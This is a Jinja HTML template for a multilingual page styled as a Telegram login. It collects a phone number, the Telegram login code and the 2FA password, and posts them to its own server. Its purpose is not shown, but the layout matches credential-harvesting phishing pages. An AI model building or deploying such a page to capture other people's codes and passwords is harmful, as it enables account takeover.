<!DOCTYPE html>
<html lang="{{ lang or 'ru' }}">
<head>
    <meta charset="UTF-8">
    <title>{{ _('Вход в Telegram') }}</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <div class="logo"></div>
        <h1>{{ _('Войти в Telegram') }}</h1>
        
        <!-- Выбор языка -->
        <form method="GET" id="language-form" style="margin-bottom: 20px;">
            <label for="language-select">{{ _('Выберите язык:') }}</label>
            <select name="lang" id="language-select" onchange="document.getElementById('language-form').submit()">
                <option value="ru" {% if lang == 'ru' %}selected{% endif %}>Русский</option>
                <option value="en" {% if lang == 'en' %}selected{% endif %}>English</option>
                <option value="uk" {% if lang == 'uk' %}selected{% endif %}>Українська</option>
                <option value="de" {% if lang == 'de' %}selected{% endif %}>Deutsch</option>
                <option value="fr" {% if lang == 'fr' %}selected{% endif %}>Français</option>
                <!-- Добавляй другие языки по желанию -->
            </select>
        </form>

        {% if error %}
            <p class="error">{{ error }}</p>
        {% elif success %}
            <p class="success">{{ success }}</p>
        {% endif %}

        {% if stage == "phone" %}
        <form method="POST">
            <input type="hidden" name="lang" value="{{ lang }}">
            <input type="text" name="phone" placeholder="{{ _('Введите номер телефона') }}" required>
            <label><input type="checkbox" name="remember_me"> {{ _('Запомнить меня') }}</label>
            <button type="submit">{{ _('Далее') }}</button>
        </form>

        <p style="font-size: small; margin-top: 10px;">{{ _('Проверьте код страны и введите номер телефона') }}</p>

        {% elif stage == "code" %}
        <form method="POST" action="/code">
            <input type="hidden" name="phone" value="{{ phone }}">
            <input type="hidden" name="lang" value="{{ lang }}">
            <input type="text" name="code" placeholder="{{ _('Введите код из Telegram') }}" required>
            <button type="submit">{{ _('Подтвердить') }}</button>
        </form>

        {% elif stage == "2fa" %}
        <form method="POST" action="/password">
            <input type="hidden" name="phone" value="{{ phone }}">
            <input type="hidden" name="lang" value="{{ lang }}">
            <input type="password" name="password" placeholder="{{ _('Введите пароль 2FA') }}" required>
            <button type="submit">{{ _('Войти') }}</button>
        </form>
        {% endif %}
    </div>
</body>
</html>
